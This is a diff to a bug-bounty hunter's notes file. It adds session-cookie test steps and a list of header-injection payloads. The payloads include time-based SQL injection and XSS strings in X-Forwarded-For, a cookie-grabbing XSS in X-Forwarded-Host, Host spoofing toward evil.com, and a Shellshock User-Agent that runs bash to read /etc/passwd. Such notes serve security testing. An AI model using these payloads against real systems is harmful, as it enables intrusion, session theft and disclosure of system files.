@@ -1228,7 +1228,18 @@ if you got ban from domain like hossam.com try to see any other subdomain test.h
 	- change some of details in repeater 
 	- go to account if found changes of repeater there then (bug )
 	
-	
+9- modify 1 character in cookie token and resubmit, check if the session is still exists 
+	- check session cookie expiration time 
+	- Indentify cookie domain scope 
+	- check flag http only secure flag and same site 
+	- check before and after session cookie value
+10- 
+
+
+
+
+
+
 -------------------------------------------------------------------------------------------------------
 AEM 
 If you hunt on a Drupal website: fuzz with intruder on '/node/$' where '$' is a number (from 1 to 500 for example). You could find hidden pages (test, dev) which are not referenced by the search engines.
@@ -1435,9 +1446,11 @@ headers injection with param miner
 	-Host: redacted.com.evil.com
 	-Host: example.com?.mavenlink.com
 	-Host: javascript:alert(1);
-	-X-Forwarded-For: 1"AND(SELECT1(SELECT(SLEEP(100)))im4x)-- im4x
-	-X-Forwarded-For: <script>alert(11)</script>
+	- X-Forwarded-For: 1"AND(SELECT1(SELECT(SLEEP(100)))im4x)-- im4x
+	- X-Forwarded-For: <script>alert(11)</script>
 	- X-Forwarded-For: hossam'; waitfor delay '0:0:16' --		=> see in burpsuite 
+	- X-Forwarded-Host: bing.com”>img src/onerror=prompt(document.cookie)>
+	- User-Agent : () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd' 
 	
 2- ali ' OR 1=1-- 
 3-  	-	X_FORWARDED_FOR :127.0.0.1' or 1=1#
